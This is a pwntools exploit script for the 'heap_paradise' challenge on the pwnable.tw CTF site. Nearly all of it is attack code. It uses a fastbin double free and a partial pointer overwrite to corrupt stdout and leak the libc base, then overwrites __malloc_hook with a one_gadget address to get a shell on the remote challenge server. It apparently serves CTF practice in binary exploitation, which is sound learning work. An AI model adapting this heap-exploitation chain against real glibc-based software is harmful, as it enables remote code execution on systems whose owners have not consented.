#!/usr/bin/python

from pwn import *
'''
[*] '[REDACTED]/heap_paradise'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
    FORTIFY:  Enabled
'''

local = False
if '-r' not in sys.argv:
    local = True


def create(size, data):
    p.sendlineafter('Choice:', '1')
    p.sendlineafter('Size :', str(size))
    p.sendafter('Data :', data)

def free(idx):
    p.sendlineafter('Choice:', '2')
    p.sendlineafter('Index :', str(idx))

while True:
    p = process(
        ['./ld-2.23.so', './heap_paradise'], 
        env= {'LD_PRELOAD': os.getcwd() + '/libc_64.so.6'}
    ) if local else \
         remote('chall.pwnable.tw', 10308)

    #Three chunks to begin with
    create(0x68, "A"*0x50 + p64(0) + p64(0x71)) #0 
    create(0x68, "B"*0x20 + p64(0x71)*0x8)  #1
    create(0x68, "C"*(0x20) + p64(0) + p64(0x21) + p64(0)*3 + p64(0x11))    #2

    free(2)
    free(1)
    free(2)

    create(0x68, '\x60')    #3
    create(0x68, "A"*0x10)  #4
    create(0x68, "C"*0x10)  #5
    create(0x68, p64(0)*1 + p64(0xa1))  #6      Fake chunk (initially created)

    free(1)

    create(0x68, p16(0xf5dd))   #7

    free(0)
    free(6)
    free(0)

    create(0x68, "A"*0x50 + p64(0x0) + p64(0x71) + '\x70')    #8
    create(0x68, p64(0) + p64(0x71))    #9
    create(0x68, "A"*0x10)  #10

    try:
        create(0x68, "A"*0x33 + p64(0xfbad1800) + p64(0)*3 + '\x00')    #11
    except:
        p.close()
        continue

    p.recv(64)
    leak = u64(p.recv(8))
    libc_base = leak - 0x3c4600
    malloc_hook = libc_base + 0x3c3aed
    log.info(hex(libc_base))

    free(0)
    free(6)
    free(0)

    one_gadget = libc_base + 0xef6c4

    create(0x68, "R"*0x50 + p64(0x0) + p64(0x71) + p64(malloc_hook))    #12
    create(0x68, p64(0) + p64(0x71))    #13
    create(0x68, "A"*19 + p64(one_gadget))  #14

    if local:
        gdb.attach(p)

    p.interactive()
